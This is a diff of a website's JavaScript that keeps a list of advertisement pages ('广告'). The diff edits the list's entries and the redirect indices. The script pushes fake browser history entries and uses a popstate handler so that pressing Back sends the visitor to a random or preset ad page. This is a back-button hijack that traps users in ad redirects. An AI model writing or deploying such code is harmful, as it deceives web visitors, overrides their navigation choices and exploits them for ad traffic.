@@ -1,16 +1,16 @@
 var globalLink = new Array();
 var apidomain = '//' + location.hostname + '/';
 // 广告
-globalLink.push(apidomain + 'qysq.html');
-globalLink.push(apidomain + 'tsyj.html');
-globalLink.push(apidomain + 'xwfkys.html');
-globalLink.push(apidomain + 'yysx.html');
-globalLink.push(apidomain + 'zrl.html');
-globalLink.push(apidomain + 'nkgg.html');
-globalLink.push(apidomain + 'mldq.html');
+globalLink.push(apidomain + 'qysq.html');//0
+globalLink.push(apidomain + 'tsyj.html');//1
+globalLink.push(apidomain + 'xwfkys.html');//2
+globalLink.push(apidomain + 'yysx.html');//3
+globalLink.push(apidomain + 'zrl.html');//4
+globalLink.push(apidomain + 'nkgg.html');//5
+//globalLink.push(apidomain + 'mldq.html');
 //globalLink.push(apidomain + 'yx.html');
-globalLink.push(apidomain + 'ydjz.html');
-globalLink.push(apidomain + 'lzy.html');
+globalLink.push(apidomain + 'ydjz.html');//6
+globalLink.push(apidomain + 'lz515y000.html');//7
 
 function hh() {
     history.pushState(history.length + 1, "message", "#" + new Date().getTime());
@@ -24,16 +24,16 @@ $(window).on('popstate', function(e){
     var number = Math.floor(globalLink.length * Math.random());
     var path = location.pathname.split('.')[0];
     if (path.substr(1) == 'ydjz') {
-        number = 6;
+        number = 7;
     }
     // if (path.substr(1) == 'yx') {
     //     number = 8;
     // }
-    if (path.substr(1) == 'mldq') {
-        number = 8;
+    if (path.substr(1) == 'lz515y000') {
+        number = 5;
     }
     if (path.substr(1) == 'nkgg') {
-        number = 7;
+        number = 1;
     }
     jump(globalLink[number]);
 });
